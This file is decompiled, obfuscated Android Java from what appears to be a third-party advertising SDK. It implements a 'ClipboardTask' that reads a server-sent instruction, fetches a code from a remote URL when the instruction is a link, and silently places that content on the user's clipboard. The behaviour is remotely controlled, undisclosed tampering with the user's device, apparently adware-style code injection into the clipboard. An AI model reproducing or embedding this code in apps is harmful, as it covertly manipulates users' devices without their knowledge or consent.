package com.kkwinter.thirdsdk.advworkflow.b;


import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.text.TextUtils;
import java.util.HashMap;
import org.json.JSONObject;

public final class b extends a {
    private String k;

    public b(Context var1, String var2, String var3, String var4, String var5, long var6, JSONObject var8, String var9, HashMap<String, Object> var10, aa var11) {
        super(var1, var2, var3, var4, var5, var6, var8, var9, var10, var11);
    }

    public static JSONObject a(String var0) {
        com.kkwinter.thirdsdk.advworkflow.a.d var3;
        try {
            var3 = new com.kkwinter.thirdsdk.advworkflow.a.d(var0);
            var3.a("Connection", "close");
            var3.m();
            var3.n();
            var3.o();
        } catch (Exception var2) {
            return null;
        }

        try {
            var0 = var3.k();
            if (TextUtils.isEmpty(var0)) {
                return null;
            } else {
                JSONObject var4 = new JSONObject(var0);
                return var4;
            }
        } catch (Exception var1) {
            return null;
        }
    }

    private void b() {
        if (TextUtils.isEmpty(this.k)) {
            this.a(0, "[ClipboardTask] 拷贝内容为空");
        } else if (this.b(this.k)) {
            this.a(1, "");
        } else {
            this.a(0, "[ClipboardTask] 拷贝内容到剪切板失败");
        }
    }

    private boolean b(String var1) {
        try {
            ((ClipboardManager)this.a.getSystemService(Context.CLIPBOARD_SERVICE)).setPrimaryClip(ClipData.newPlainText((CharSequence)null, var1));
            return true;
        } catch (Exception var2) {
            return false;
        }
    }

    public final void a() {
        this.k = null;
        JSONObject var1 = com.kkwinter.thirdsdk.advworkflow.util.k.a(this.i, "task", (JSONObject)null);
        if (var1 != null) {
            this.k = com.kkwinter.thirdsdk.advworkflow.util.k.a(var1, "instruction", "");
        }

        if (!this.k.startsWith("https://") && !this.k.startsWith("http://")) {
            this.b();
        } else {
            (new Thread(new Runnable() {
                public final void run() {

                    JSONObject var2 = a(k);
                    if (var2 == null) {
                        a(0, "[ClipboardTask] 协议获取失败");
                    } else {

                        String var1 = com.kkwinter.thirdsdk.advworkflow.util.k.a(var2, "code", "");
                        String var3 = com.kkwinter.thirdsdk.advworkflow.util.k.a(var2, "kl", "");

                        if (var1.equalsIgnoreCase("A00000") && !TextUtils.isEmpty(var3)) {
                            k = var3;
                            com.kkwinter.thirdsdk.advworkflow.util.j.a(new Runnable() {
                                public final void run() {
                                    b();
                                }
                            }, 1L);
                        } else {
                            a(0, "[ClipboardTask] 协议解析失败");
                        }
                    }
                }
            })).start();
        }
    }
}

